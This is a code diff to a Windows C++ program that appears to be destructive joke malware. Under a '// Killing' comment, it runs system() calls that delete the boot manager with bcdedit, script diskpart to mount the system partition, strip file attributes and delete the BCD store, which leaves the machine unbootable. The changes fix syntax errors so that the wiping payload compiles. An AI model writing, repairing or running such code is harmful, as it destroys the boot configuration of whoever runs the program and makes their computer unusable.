@@ -43,6 +43,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     int sw = GetSystemMetrics(0);
     int sh = GetSystemMetrics(0);
 	auto path = get_desktop_path();
+	int counter;
 
     int msgboxID = MessageBox(
         NULL,
@@ -59,13 +60,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         CreateThread(0, 0, shader1, 0, 0, 0);
 
         // Killing
-        system("bcdedit /store c:\\boot\\bcd /delete {bootmgr} /f")
+        system("bcdedit /store c:\\boot\\bcd /delete {bootmgr} /f");
 		system("echo select disk 0 > diskpart.txt");
 		system("echo select partition 1 >> diskpart.txt");
 		system("echo assign letter=S >> diskpart.txt");
 		system("echo exit >> diskpart.txt");
         system("diskpart /s diskpart.txt");
-        system("attrib -s -h -r S:\* /s /d");
+        system("attrib -s -h -r S:\\* /s /d");
 		system("del S:\\Boot\\BCD");
 		system("bcdedit /delete {bootmgr} /f");
 
@@ -103,6 +104,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
 	return 0;
 }
+
 
 
 
